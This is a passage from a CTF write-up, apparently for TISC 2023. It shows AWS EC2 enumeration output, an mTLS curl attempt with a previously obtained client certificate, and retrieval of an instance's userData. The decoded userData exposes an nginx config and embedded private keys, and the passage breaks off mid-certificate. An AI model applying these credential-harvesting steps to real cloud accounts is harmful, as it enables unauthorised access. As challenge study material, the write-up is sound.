                            "MacAddress": "02:e5:c1:c3:47:20",
                            "NetworkInterfaceId": "eni-05a6609c4a1cd826d",
                            "OwnerId": "232705437403",
                            "PrivateDnsName": "ip-192-168-0-172.ap-southeast-1.compute.internal",
                            "PrivateIpAddress": "192.168.0.172",
                            "PrivateIpAddresses": [
                                {
                                    "Association": {
                                        "IpOwnerId": "amazon",
                                        "PublicDnsName": "ec2-13-213-29-24.ap-southeast-1.compute.amazonaws.com",
                                        "PublicIp": "13.213.29.24"
                                    },
                                    "Primary": true,
                                    "PrivateDnsName": "ip-192-168-0-172.ap-southeast-1.compute.internal",
                                    "PrivateIpAddress": "192.168.0.172"
                                }
                            ],
                            "SourceDestCheck": true,
                            "Status": "in-use",
                            "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
                            "VpcId": "vpc-063e577d022d3fa3b",
                            "InterfaceType": "interface"
                        }
                    ],
                    "RootDeviceName": "/dev/sda1",
                    "RootDeviceType": "ebs",
                    "SecurityGroups": [
                        {
                            "GroupName": "Generic network for staging and production",
                            "GroupId": "sg-0c178b9e55483a8da"
                        }
                    ],
                    "SourceDestCheck": true,
                    "VirtualizationType": "hvm",
                    "CpuOptions": {
                        "CoreCount": 1,
                        "ThreadsPerCore": 2
                    },
                    "CapacityReservationSpecification": {
                        "CapacityReservationPreference": "open"
                    },
                    "HibernationOptions": {
                        "Configured": false
                    },
                    "MetadataOptions": {
                        "State": "applied",
                        "HttpTokens": "optional",
                        "HttpPutResponseHopLimit": 1,
                        "HttpEndpoint": "enabled",
                        "HttpProtocolIpv6": "disabled",
                        "InstanceMetadataTags": "disabled"
                    },
                    "EnclaveOptions": {
                        "Enabled": false
                    },
                    "PlatformDetails": "Linux/UNIX",
                    "UsageOperation": "RunInstances",
                    "UsageOperationUpdateTime": "2023-09-16T07:06:20+00:00",
                    "PrivateDnsNameOptions": {
                        "HostnameType": "ip-name",
                        "EnableResourceNameDnsARecord": false,
                        "EnableResourceNameDnsAAAARecord": false
                    },
                    "MaintenanceOptions": {
                        "AutoRecovery": "default"
                    },
                    "CurrentInstanceBootMode": "legacy-bios"
                }
            ],
            "OwnerId": "232705437403",
            "ReservationId": "r-0f7a5b16993d217d9"
        }
    ]
}
```

Based on the output, there were two EC2 instances:
1. IPv4 Address: `54.255.155.134`
2. IPv4 Address: `13.213.29.24`

Since `13.213.29.24` was the staging server, it could be deduced that `54.255.155.134` was likely the production server. 

![](/assets/images/tisc2023/Pasted image 20231002210630.png)

The production server may also be configured for mTLS, I used the previous private key and certificate again:

```bash
$ curl -k --cert ./client.crt --key client.key https://54.255.155.134 
<html>
<head><title>400 The SSL certificate error</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<center>The SSL certificate error</center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

Unforunately it seemed they were not accepted. Returning back to enumerating more about the production server, the `userData` field in an EC2 instance is normally used to contain a script that is executed after it is started, which can viewed like so:

```bash
sh-5.2# aws ec2 describe-instance-attribute --instance-id i-02602bf0cf92a4ee1 --attribute userData
<nstance-id i-02602bf0cf92a4ee1 --attribute userData
{
    "InstanceId": "i-02602bf0cf92a4ee1",
    "UserData": {
        "Value": "IyEvYmluL2Jhc2gKc3VkbyBhcHQgdXBkYXRlCnN1ZG8gYXB0IHVwZ3JhZGUgLXkgCnN1ZG8gYXB0IGluc3RhbGwgbmdpbnggLXkKc3VkbyBhcHQgaW5zdGFsbCBhd3NjbGkgLXkgCmNhdCA8PFxFT0wgPiAvZXRjL25naW54L25naW54LmNvbmYKdXNlciB3d3ctZGF0YTsKd29ya2VyX3Byb2Nlc3NlcyBhdXRvOwpwaWQgL3J1bi9uZ2lueC5waWQ7CmluY2x1ZGUgL2V0Yy9uZ2lueC9tb2R1bGVzLWVuYWJsZWQvKi5jb25mOwoKZXZlbnRzIHsKCXdvcmtlcl9jb25uZWN0aW9ucyA3Njg7CgkjIG11bHRpX2FjY2VwdCBvbjsKfQoKaHR0cCB7CgoJc2VuZGZpbGUgb247Cgl0Y3Bfbm9wdXNoIG9uOwoJdGNwX25vZGVsYXkgb247CglrZWVwYWxpdmVfdGltZW91dCA2NTsKCXR5cGVzX2hhc2hfbWF4X3NpemUgMjA0ODsKCglpbmNsdWRlIC9ldGMvbmdpbngvbWltZS50eXBlczsKCWRlZmF1bHRfdHlwZSBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW07CgoJc2VydmVyIHsKCQlsaXN0ZW4gNDQzIHNzbCBkZWZhdWx0X3NlcnZlcjsKCQlsaXN0ZW4gWzo6XTo0NDMgc3NsIGRlZmF1bHRfc2VydmVyOwoJCXNzbF9wcm90b2NvbHMgVExTdjEgVExTdjEuMSBUTFN2MS4yIFRMU3YxLjM7IAoJCXNzbF9wcmVmZXJfc2VydmVyX2NpcGhlcnMgb247CgoJCXNzbF9jZXJ0aWZpY2F0ZSAgICAgICAgIC9ldGMvbmdpbngvc2VydmVyLmNydDsKCQlzc2xfY2VydGlmaWNhdGVfa2V5ICAgICAvZXRjL25naW54L3NlcnZlci5rZXk7CgkJc3NsX2NsaWVudF9jZXJ0aWZpY2F0ZSAgL2V0Yy9uZ2lueC9jYS5jcnQ7CgkJc3NsX3ZlcmlmeV9jbGllbnQgICAgICAgb3B0aW9uYWw7CgkJc3NsX3ZlcmlmeV9kZXB0aCAgICAgICAgMjsKCQlsb2NhdGlvbiAvIHsKCQkJCWlmICgkc3NsX2NsaWVudF92ZXJpZnkgIT0gU1VDQ0VTUykgeyByZXR1cm4gNDAzOyB9CgoJCQkJcHJveHlfcGFzcyAgICAgICAgICAgaHR0cDovL2ZsYWdfc2VydmVyOwoJCX0KCgkJYWNjZXNzX2xvZyAvdmFyL2xvZy9uZ2lueC9hY2Nlc3MubG9nOwoJCWVycm9yX2xvZyAvdmFyL2xvZy9uZ2lueC9lcnJvci5sb2c7Cgl9CgkKCWd6aXAgb2ZmOwoJaW5jbHVkZSAvZXRjL25naW54L2NvbmYuZC8qLmNvbmY7CglpbmNsdWRlIC9ldGMvbmdpbngvc2l0ZXMtZW5hYmxlZC8qOwp9CgpFT0wKY2F0IDw8XEVPTCA+IC9ldGMvbmdpbngvc2l0ZXMtZW5hYmxlZC9kZWZhdWx0Cgp1cHN0cmVhbSBmbGFnX3NlcnZlciB7CiAgICBzZXJ2ZXIJbG9jYWxob3N0OjMwMDA7Cn0Kc2VydmVyIHsKCWxpc3RlbiAzMDAwOwoKCXJvb3QgL3Zhci93d3cvaHRtbDsKCglpbmRleCBpbmRleC5odG1sOwoKCXNlcnZlcl9uYW1lIF87CgoJbG9jYXRpb24gLyB7CgkJIyBGaXJzdCBhdHRlbXB0IHRvIHNlcnZlIHJlcXVlc3QgYXMgZmlsZSwgdGhlbgoJCSMgYXMgZGlyZWN0b3J5LCB0aGVuIGZhbGwgYmFjayB0byBkaXNwbGF5aW5nIGEgNDA0LgoJCXRyeV9maWxlcyAkdXJpICR1cmkvID00MDQ7Cgl9Cgp9CkVPTApjYXQgPDxcRU9MID4gL2V0Yy9uZ2lueC9zZXJ2ZXIuY3J0Ci0tLS0tQkVHSU4gQ0VSVElGSUNBVEUtLS0tLQpNSUlEeHpDQ0FxOENGRjRzUVk0eHExYUF2Zmc1WWRCSk9yeHFyb0c1TUEwR0NTcUdTSWIzRFFFQkN3VUFNQ0F4CkhqQWNCZ05WQkFNTUZXUmxkbk5sWTIxbGIzY3RjSEp2WkhWamRHbHZiakFlRncweU16QTNNakV4TkRVd05ERmEKRncweU5EQTNNakF4TkRVd05ERmFNQ0F4SGpBY0JnTlZCQU1NRldSbGRuTmxZMjFsYjNjdWNISnZaSFZqZEdsdgpiakNDQWlJd0RRWUpLb1pJaHZjTkFRRUJCUUFEZ2dJUEFEQ0NBZ29DZ2dJQkFNWVJxTWMxdXNiUy80eW9KOXFXCjRReEh3RnlIeDZiN01raTR2VkpEOEdvTnlHVVdmVWxrc1VocTg0Wkk0WnBBbjc4dHZvVitsemVXUU53NFhFejIKWDNVM1hJN0FIRmVRWW84V0xjdmFvQWdqMFA3dU0xa2Jub1hVeDU0eXJhQnR5OTh1T0tMRHd1R0QyWk5NeVpqUgp5RTEwMDVlZWhQL21ydEg3NU43Zk44WlgyR0QzMC9IZ0RzM3dVY2ROMU45L0NHV0Y3czZ6U01OS0t5TGJnemQ0ClVsT0lZMWpDUU4wSnlSZlJpa3hmbXVLV2VFbFZDejQraVh2QzhpNjlxUkw0TjYzWDVUTTkwamo5S0l6MUtxY28KZ2tYK21XYVFTQUtrR0tRSTZjaFlqb1ZicVFqakY4MEtPOC8zV0FGY1h3aXIxQzJZNFpubUszWTlvNUo0T3lsbgpCNWVWUmtscXNkTHl2MUtWdTJ4czErZ3JLdEdldDQ5bi9TTk11TXdlc0ZtYjZ0UHMzaE04YUcwdi8wVzVlSVhiCnRCVnd1NFh3T2xJVFdvMVRlL3dtUC96YWk2RllseUxJRXBDRDZMSjkvc2FqcXhZdGFzbFNIbGdJanFUSTlWS28KbmFoRWJqOFhhN1RNck5GYnIyTlk1ejNvTHlwSUNycUUvelB1T2dNQk02RFg1Y25sZnFlQXdJVm5MNVF4UW9RZQpvY3dTRGVBWERJY05kekhlbFVDZ0JpU2pMdzA1NWh3TnNMeC9aUTZZdTdZNFMwaEUxQ1paM2crK1dvSC9rTHhpCmk2cEhvYVRIc0I0Tkl6NURZaVFFeWR5d3pqblg3RkFYcVl3ZjRpWllMSWlTOU02aVhYQjFPTUJndElOVnhnbEEKY0JVNTQrSTR1NGgvQ1VralBZUHM4eDExQWdNQkFBRXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBQ29DUVo1ZQo4YTRSZ01Pb2VxaWFpS0Y0eFZLOEtRR3RFVUtqSWVZVDRMSWVWRlJocEI1bS9SV3hqMmRzaEhOcjFiSldGUCtICmlyZWNVaXNxTGtwbUFaUlRHR2JLOThoTjFtdVY4NUxSc3lRVGZlc1ZOQ1Q4QXozZzBVVUZONnJRZE1vQXFuOTcKbEEvcEs0TjdOeGk3SERoYWlwWlE2dVBjR1ZRa3JjS09TY3hxN1kxSUoxTnEwcXBLbHJ4MlFJekIzcnBFMUNwbQplWVgxcUhxZ2ZMYytXR2J3RmZXRjlyYVNHMGJiTG1CK2tyWHRUVUVxb3JUdHI0UlVRM0pDaDBtb0o1VG9VZ3pjCnFhWWRLVjg3SmRBc2g4OERjOFI0eEV5K0NnbVAwVGVjc2R1NHZwK1FHTElGeUtWWFYxblBXRjJpaHo4WGVsTGUKS2lOaWk3YjZWNDNIU3JBPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCgpFT0wKY2F0IDw8XEVPTCA+IC9ldGMvbmdpbngvc2VydmVyLmtleQotLS0tLUJFR0lOIFJTQSBQUklWQVRFIEtFWS0tLS0tCk1JSUpLUUlCQUFLQ0FnRUF4aEdveHpXNnh0TC9qS2duMnBiaERFZkFYSWZIcHZzeVNMaTlVa1B3YWczSVpSWjkKU1dTeFNHcnpoa2pobWtDZnZ5MitoWDZYTjVaQTNEaGNUUFpmZFRkY2pzQWNWNUJpanhZdHk5cWdDQ1BRL3U0egpXUnVlaGRUSG5qS3RvRzNMM3k0NG9zUEM0WVBaazB6Sm1OSElUWFRUbDU2RS8rYXUwZnZrM3Q4M3hsZllZUGZUCjhlQU96ZkJSeDAzVTMzOElaWVh1enJOSXcwb3JJdHVETjNoU1U0aGpXTUpBM1FuSkY5R0tURithNHBaNFNWVUwKUGo2SmU4THlMcjJwRXZnM3JkZmxNejNTT1Awb2pQVXFweWlDUmY2WlpwQklBcVFZcEFqcHlGaU9oVnVwQ09NWAp6UW83ei9kWUFWeGZDS3ZVTFpqaG1lWXJkajJqa25nN0tXY0hsNVZHU1dxeDB2Sy9VcFc3Ykd6WDZDc3EwWjYzCmoyZjlJMHk0ekI2d1dadnEwK3plRXp4b2JTLy9SYmw0aGR1MEZYQzdoZkE2VWhOYWpWTjcvQ1kvL05xTG9WaVgKSXNnU2tJUG9zbjMreHFPckZpMXF5VkllV0FpT3BNajFVcWlkcUVSdVB4ZHJ0TXlzMFZ1dlkxam5QZWd2S2tnSwp1b1QvTSs0NkF3RXpvTmZseWVWK3A0REFoV2N2bERGQ2hCNmh6QklONEJjTWh3MTNNZDZWUUtBR0pLTXZEVG5tCkhBMnd2SDlsRHBpN3RqaExTRVRVSmxuZUQ3NWFnZitRdkdLTHFrZWhwTWV3SGcwalBrTmlKQVRKM0xET09kZnMKVUJlcGpCL2lKbGdzaUpMMHpxSmRjSFU0d0dDMGcxWEdDVUJ3RlRuajRqaTdpSDhKU1NNOWcrenpIWFVDQXdFQQpBUUtDQWdFQWppcWV1bDRXY2grQXpiVGs1a0RseDZxNHA3SE4zRXp4Q3NHUElqMGhrdjNSbUwxTHNDSldIV1NtCjV2dm84bzd3R29qNjkxYWxzNEJsamF2bWxGZENyUi9QajZiVXNRVXh1UUp5WEovUHZnZjNPd1ErVnZjOEVWTm8KOUdQcnUvc1RHbDVTeUlFNm9DUERSN2NWL0ZxWEt3RnYzcVFwVW9TQmRyY1d6K0hvWnJVbTJuTUg3ZFNreTZ4egpCbHNYTUZROThxRHZoKzJuaklUdjhWVWVHZktESlBJQVhQVVJHWmFzZ0N3bTJDckhRVncvZW1OUWJwejBrYUNiCnRIRHRxbS8vaHdndnUxZmtUSU5wVjhPaG1kbTVxQVBXbDRkNEtHMGdRcDBqTUdwZjRkaW91M2hFM1NjN1IwcUMKSUhmc3ZveVcveU44eXJvcTkvUEdOSnVYMjEvWVVmQWtta3JvcGxneWtxNGZ3ZFlEcXFYcnYzRVE0WnAwalRRNAozUGVvTlZPTVlBTlZvU3dZL2Zvajl5d1hZUGxLUy9pZW5TUGdtblVFd2VXUk1NeW5LOWNoWUY1WHlCY0hLWVROCjRXbEJuQTl1SERxdE93L09GbVJwOXFabnN2OG5GaWFVVkxXY2xSRzdPdjRVbXVhbis3V2Mybzdja05iZTY3ZTMKdmt5Q0t1cDRiTTFZMnJISWhrSGdmZXVhb1NjbVNmMHBOYzA2VUlFZVE1VXNzMmJKYm9ZeGtTeldkVkhFQWhidwpmTXB5R1dMV3EzaVFOU3lsNEVLd2lJUWFzUktFcEhUN2RTcTJhTjVCZCt6N2w4eTVzNUNtYlVqTk9Gem1NZHhVCjFnRHZKVFE2M3ZPV1FoR2FlUDRiWTY1N0crbEJhVjZFT2ZlbHNQMGRZdCtZUnBpWWNBRUNnZ0VCQVBsUWJRN0oKOCtDSmZ2aFNUVWR6YnNrdGZObUVoendDdUJYYkZQV1pRdlhiWkpaUXpHWFRGTTM2MFpUUFNyMnlXMkQ2TnlMdgpsc2toTktmWEVSbHNub0drK0FuOUl1VUVKQlpnaDhEODhnb0xhL2JjTUxZVldKNVg3cFZ5dlRpZEtTQnc5V2cvCllWZDBqdVFXdVBTQjRLMW1IWnhuZk1JSHNDWWNMcXZ5QTlPSFJJbmFiN3F2K0o0QXh0MnJudTd1ajFSVnJaMVoKQnd3ZmtQNEtveStHcmUxalhuVTRuMkV6RjlSWmdjcXAxZ1JRS3I2V0xDVlQ1c2RQSWZGV1NDSWZEREtxaHdRSgpKU0toL0ttK09NWndGZXNXbFVSOW0rNk1RbGJRZ2JoWCsvKzRxdGIrdGttNXZ5OFVzRDdBZ2RJMTIxRlpkSlRVCkx5QlEwNnlreFJoOGt5VUNnZ0VCQU10aGJiQ0d4cStCaGNRbFNtUU9jTXdaVncwMVhsQnQxcDN0L2ZNVFhGVGwKdE9tWExjQlM4SHhOclMxS0V2alovZmJMU2tLdVdyRi93SlRtb0FEYVlCa1hId2lpMko5blBLVk9mVlZmSlZBVAp3bDlCcllZSzRTK3lqeHBFY3I2VFhPN1JGRmNpS3MyWlhhdkJvUU9ObEhLNlZUb2o4SUhzV3VoUXZFYjVOcmp4CnVaSkxMd0lnOXB5ODZNYStMd1FmU25ycWJGaFowMFlORVJrTkxqblZCNFNDd3MzZHR2Z2JxYjc0b20xVjhveUoKSk1GNSsvYStWYXpENmJJVjhRdUo3SHZqWWRLOWdWWS9UcFV1S3UvaldtVVkxR0phSmRORU42ajlLdk1MdUozYgpqbmd2YWpGRENoMnBDM1h3a3hNcGFBNzBMWk5jZ1R3cElqeDFBdFNrZUJFQ2dnRUFCdkZQYUNjRmpJNG5wQUNlCnVFdWxuU0tRSkhxRlRZMkIxTkg1L25EYkpYK0xpSWdOZVJSc3N1TzJMRit0WkNUd1dIMy9SUkRJOFNia2tYdnkKdFBPS1ltL1duR2laTFNsMVc4NHFXWnh4blFmK1pLeHpDczhEWGIxekhtUklrcWdGdWlxTEd2RVE0OStTRHhYMgo1cEFyVW9qU2NFV05ldFc5K1FHMTV3SGhTMldyNmU3VVI2Mll6Y1dWeEJ5QVc0VDNKdEVQK1o2K0RIOWdpVUtBCmt0VThTSzBJdDFqeFQwS2Qra0xYMDIzeFVNTnV2VW52UnNiVVdWNkJ3bmUxb0lXZTBGWmhWaUp2RDB6VmZXQ1gKc2lieTVVNEdzQmFUWGd3MzJMVUx0N2R6aEFaL2MyYzZha2txNHNPL3VLK2hyZG5rRnByWUhVRGZZeFg5SHdTagpuRy96cFFLQ0FRRUFydUlPVWpieWJrUXY1Q1EwdmFqMU1XdXd3VGpjNnNnb1BoRkJ4MTBramhRZjVxVUt3RkFSClhySGtjZ2M2SFNaR0RZdHRSYjFyV3lvQlRZaXFtVkV1UlNUdW1KeC9MVUsya1diV3V5eGZoMllXUTViVVFXamwKamdBNnNWbWVXV1dhQ2ZsYlJqbXBHTFlDS0FrT0RXSVcvamhmeE9qV2pNSFN3ZVY2b0lUM216eXdWNjJ5dEYvbgo3NHM1bG53L0xZcENuME1vK3lmeVZsQXlIWnFKMzB6aGMvNkV5RVVZYW14UElGbm9RYUFnT3R4SzhOdVYzK3gyCisySlRkOEVLVHVQQXFCODBKT1N6YkpodldEUWswN1pxS25pWldDRXdXV1JWZ0VpQ1FCQWFKaE4vaExVdzJUOU8KV1liY3hnT2lWRjNNanQ5RXVXeFg3SVZxWFJZNDR1U3lJUUtDQVFCZ0pyd1FScFovSVNzeEptMmZKWElqc2V6UQpNUHhGZU1FUU1ENXRqaU51MXlYdFlJVFJIZy9HK2NGdkdIVmc0UExXN1owOTM0TjEyeFdycElBdE00QmxDMlpzCklMSitmQjNxWkZMb01KS21zWndWSFphd1hpZGk3d25RQVN2cFlEaXhTOTlYQjJlY2NRR2dpeVRmTVU1UXdPVjYKUGtvZmhqeWVCYlNwekZ0cHRIekpGdUVpdy8ycmRrd0xFWkdQT2k4elArNVQybTdDeWFVdWppb3o3b3B1U3JFcgp3dnA5YXl6TFRXWnRuK2hJTDhIVE9WRmp6VHhuTjNXQ2JiUlB1R3A3TFlSNnI0UmQyRVM3dHFaaFV1UnFza05FCjNuR1RRNlFLNTBqdFZXQjl4b3NKbzRoZEFFS1krOW14NmlaUUp4bEFmOWJuaURoWkVpdWJ4RjhxcXMxSAotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQoKRU9MCmNhdCA8PFxFT0wgPiAvZXRjL25naW54L2NhLmNydAotLS0tLUJFR0lOIENFUlRJRklDQVRFLS0tLS0KTUlJRElUQ0NBZ21nQXdJQkFnSVVRM1NOL0ljN1QyeDF2NmNBNmdLUFV4TlNsTmd3RFFZSktvWklodmNOQVFFTApCUUF3SURFZU1Cd0dBMVVFQXd3VlpHVjJjMlZqYldWdmR5MXdjbTlrZFdOMGFXOXVNQjRYRFRJek1EY3lNVEUwCk5UQTBNRm9YRFRJME1EY3lNREUwTlRBME1Gb3dJREVlTUJ3R0ExVUVBd3dWWkdWMmMyVmpiV1Z2ZHkxd2NtOWsKZFdOMGFXOXVNSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXhOa3NrYmI3bnFSRApuVk1GSnJXUVVZdUNVUnlZam5jR1ZaVEVGek8xY09PRUFSMzVEbWNSdVZnV1RBQ1VKZFJScWI2bEwvN1ZiZmdtCjFUVjh2ajd4L3FOY2lFdmQ0L056b3RsQlhZQ1hKTGlsTEZVeWR4dUVxenB4WDlmQ0d4UUowbnNLRHN3WXVVcGkKN2lyZTk1Mnk4WUFsdS9EQUFwZndtL0s4clMyZWR2dkoyMndyMVF6bm1FSWVkZjNHRkkzZ2lGZ3lpQjgxYm1xcwpXK3ZMd2Q1OTlzZVNWYzQ4c200VmRJYncxS3hRclFWVTlSd3I3VnlSN2ZyRklpdFBJcFRSZkQ2UC92WkFaU21kCmljUEFxKzJpREdqMVlFeTRBZlJzbithaDdYUXFwNVpDNGlaY2NaaWRIR1ZsSFNtc0RYcUoya3B3ZXVZb1ZDenkKSGpNSXVQcWtEd0lEQVFBQm8xTXdVVEFkQmdOVkhRNEVGZ1FVcjg3cUxmK0lmR3Jma1lhamRJdHFNRnpieTc4dwpId1lEVlIwakJCZ3dGb0FVcjg3cUxmK0lmR3Jma1lhamRJdHFNRnpieTc4d0R3WURWUjBUQVFIL0JBVXdBd0VCCi96QU5CZ2txaGtpRzl3MEJBUXNGQUFPQ0FRRUF1bTQxUjQ2ajZPbHFtcWR2RWd0M0Q1cENzVGE3ZndmYnZkcXAKRmdTbHNHcnd0UnpBeEVUWVBqNmQra1lsaUZJL1o0NnRFM3gxNUY1emlzUFBUM0YvSGpxekxQSkJ2Q1FXamlIVworblJuaXFuNU96d2dDc0tCOGtJVk8wMXRFMDJpYld5SXpMMTVzOEl2ek5UREgvV1VVZjFZdk4vUUtydnI3TkMxCmZHdWkvMzR3L1Npa2MxY2t1YXlPTTZCNnloZjJXb0N0Qy90eGFHQnhTYTk1dHFTQUR4aXcyWDRydTd2dURxSk8KVE5WWnJVM0lrRENVaFJTeHZjZXNtNG9mMEIyMUdDbXBjVUFVNzVBK1VGM3NsOGpGVE5mOG9NRlp6VzE3VzRiZwp0TWRhZDJQdmw5SUwzYldqVDB1V01PVTd1RldIUkZDS0VWcnpDeko2c1VkeWFtd3NMZz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0KCkVPTApjYXQgPDxcRU9MID4gL2V0Yy9uZ2lueC9jYS5rZXkKLS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUV2d0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktrd2dnU2xBZ0VBQW9JQkFRREUyU3lSdHZ1ZXBFT2QKVXdVbXRaQlJpNEpSSEppT2R3WlZsTVFYTTdWdzQ0UUJIZmtPWnhHNVdCWk1BSlFsMUZHcHZxVXYvdFZ0K0NiVgpOWHkrUHZIK28xeUlTOTNqODNPaTJVRmRnSmNrdUtVc1ZUSjNHNFNyT25GZjE4SWJGQW5TZXdvT3pCaTVTbUx1Ckt0NzNuYkx4Z0NXNzhNQUNsL0NiOHJ5dExaNTIrOG5iYkN2VkRPZVlRaDUxL2NZVWplQ0lXREtJSHpWdWFxeGIKNjh2QjNuMzJ4NUpWemp5eWJoVjBodkRVckZDdEJWVDFIQ3Z0WEpIdCtzVWlLMDhpbE5GOFBvLys5a0JsS1oySgp3OENyN2FJTWFQVmdUTGdCOUd5ZjVxSHRkQ3FubGtMaUpseHhtSjBjWldVZEthd05lb25hU25CNjVpaFVMUEllCk13aTQrcVFQQWdNQkFBRUNnZ0VCQUtBQmc3ZmlDLzkwdUQwdVdYYVFpUUd2cTdyd3lwU3E3U3d0WTRNVWxmeHcKQTBIQk1rdmh2Y2R4Y1paUHRoeFZ6QmQxRHVMSGVvY0wrY3krMEduMzBrN1FUUXZBMTFsTjc0WEVvTnczQlNSbApMbVd0enZxQUZNUDJHbWYwZ2lQdWt0bFRCK2JsUVllRGpvelhyaXVLTlFVV3pCVkxhVmZ5VnpMOENSK2ZnRHBuCm5VYWk3UDB0aFQ4TWp4WGVzVnZmMWprcTR5WnFQTU9MTkxZRXVVbjVHK09rTkNIb3FyYzRVZC9GdDFscWQ0ZjEKeXZKKzlJREJaMjk4K0hoQ25sd3laK2lwVFpGVGNnelY2by9mNEhxMGhmaXFHeDBlczBHdCtqdGtwUjk5QVM0QQp4R0dVOUNNeTJiS2s3azVhYW9pbjdkbGppSWNUckNrV3NuQ2dhVkhQTkxrQ2dZRUE0YlcwQW1IV0ZtekFCVC9UClR6emdRS0pzRnZ3dktEV09KaURWVGN6WmxUZlhlV2NNOVdRdEFlY0FrMlp4QVpxdHFYRWF0emhXc0dJdm14TXIKek1LejlSTHh4UnN0dFY0eHpSd0RmY2pLelJ1WkFWMHhYUHNJdWFaUHB6cnFDWDh1RnJ2aGlqZjhwcld1TEZacgoybUM3a3hWVnBmRGpPNjhlNzRZSlZTS21PZ1VDZ1lFQTMwUHVhMHZPUFhGTDJoOFRjYmpHOUZ5VHhpZDRPUVdFCnMxSWlMWVJ3M2pWVldsSjJnQWxaNGV5K3pURzE2MnpWNFYyeUhyWkYyM2VzNDV5b1dnU1Jaa3h1ZmtRWTlDSmkKWE1YZjBxZHlDMWxWaC9uYUpYZHo1QVlyNUt3eUR2OVVLakpjNnZ1YmN1U21ENmg2SDNRT2drWmVvQ3Q3NWx3eQpqS3d3U1JSTC9nTUNnWUI0QW9McDJWZFpxUTBZUFcxL2JpRFdmUVgzMnJMQU1HbWFnRTZxQlVlVGZaT0dLM0xLCmJ5ODNHYnBHcFd0a3JQZTFaandNTzFwc2dtaEpqaEgxMTNpVDBEVFkxckNoQktwNkluRUF5bWg2VWpneWIzaTEKdFl4WUdjTzBhVERUUjlvYm9GNDFmYnRLY01OaE03bzQ3TUlQWElLanJzZERqc05tRytDT2NkUHNlUUtCZ1FDNQpuaXFiL2R3cmJRUVpCZmtPZFFiRHBpd2RkRGNaZ1NNQVN1cXJXUTdWVHhYMUQ5WUJRTVQvZGVwemdqNnl5anRQCk1LeWpwL3FRS2dFTkF2TmNVNnZtbHVqT0JTT1I1UHhPRVJ5eWNBLzZxM3pXbmJ6bHBWZ3VYWXNraEp6aHB4bDgKTTM3WXhmSkpKUnVDclJsTENSdis1eTVJajU1a3VJWTJPZm15NkRMOXJRS0JnUURlZlRnaVNLVklsTXBaUmlHdApWT0FEME1GZGEvazl0cFRQVDlIZGxMNGI0NG1rTnpQYWlsSkFUSDBYTERxU3d1WG40d0pFZ01Bd3FiTThDR1NvCk9wYXIzZml4U3JpS2t3dVR1RHk4Zk0xZGJwallDaThyS3N3R1VMVHZwRkhKUVpTRHU0K3NDRHhiWlV2OVZUQVMKYVV3ak9lWXlJWmlCK1NRdC9rVVVabTFhY0E9PQotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tCgpFT0wKYXdzIHMzIGNwIHMzOi8vZGV2c2VjbWVvdzIwMjNmbGFnMi9pbmRleC5odG1sIC90bXAvCnN1ZG8gY3AgL3RtcC9pbmRleC5odG1sIC92YXIvd3d3L2h0bWwKcm0gL3RtcC9pbmRleC5odG1sCnN1ZG8gc3lzdGVtY3RsIHJlc3RhcnQgbmdpbngK"
    }
}
```

The `userData` field contained a base64-encoded string, which when decoded, looked like this:

```bash
#!/bin/bash
sudo apt update
sudo apt upgrade -y 
sudo apt install nginx -y
sudo apt install awscli -y 
cat <<\EOL > /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	sendfile on;
	tcp_nopush on;
	tcp_nodelay on;
	keepalive_timeout 65;
	types_hash_max_size 2048;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	server {
		listen 443 ssl default_server;
		listen [::]:443 ssl default_server;
		ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; 
		ssl_prefer_server_ciphers on;

		ssl_certificate         /etc/nginx/server.crt;
		ssl_certificate_key     /etc/nginx/server.key;
		ssl_client_certificate  /etc/nginx/ca.crt;
		ssl_verify_client       optional;
		ssl_verify_depth        2;
		location / {
				if ($ssl_client_verify != SUCCESS) { return 403; }

				proxy_pass           http://flag_server;
		}

		access_log /var/log/nginx/access.log;
		error_log /var/log/nginx/error.log;
	}
	
	gzip off;
	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}

EOL
cat <<\EOL > /etc/nginx/sites-enabled/default

upstream flag_server {
    server	localhost:3000;
}
server {
	listen 3000;

	root /var/www/html;

	index index.html;

	server_name _;

	location / {
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
		try_files $uri $uri/ =404;
	}

}
EOL
cat <<\EOL > /etc/nginx/server.crt
-----BEGIN CERTIFICATE-----
MIIDxzCCAq8CFF4sQY4xq1aAvfg5YdBJOrxqroG5MA0GCSqGSIb3DQEBCwUAMCAx
HjAcBgNVBAMMFWRldnNlY21lb3ctcHJvZHVjdGlvbjAeFw0yMzA3MjExNDUwNDFa
Fw0yNDA3MjAxNDUwNDFaMCAxHjAcBgNVBAMMFWRldnNlY21lb3cucHJvZHVjdGlv
bjCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAMYRqMc1usbS/4yoJ9qW
4QxHwFyHx6b7Mki4vVJD8GoNyGUWfUlksUhq84ZI4ZpAn78tvoV+lzeWQNw4XEz2
X3U3XI7AHFeQYo8WLcvaoAgj0P7uM1kbnoXUx54yraBty98uOKLDwuGD2ZNMyZjR
yE1005eehP/mrtH75N7fN8ZX2GD30/HgDs3wUcdN1N9/CGWF7s6zSMNKKyLbgzd4
UlOIY1jCQN0JyRfRikxfmuKWeElVCz4+iXvC8i69qRL4N63X5TM90jj9KIz1Kqco
gkX+mWaQSAKkGKQI6chYjoVbqQjjF80KO8/3WAFcXwir1C2Y4ZnmK3Y9o5J4Oyln
B5eVRklqsdLyv1KVu2xs1+grKtGet49n/SNMuMwesFmb6tPs3hM8aG0v/0W5eIXb
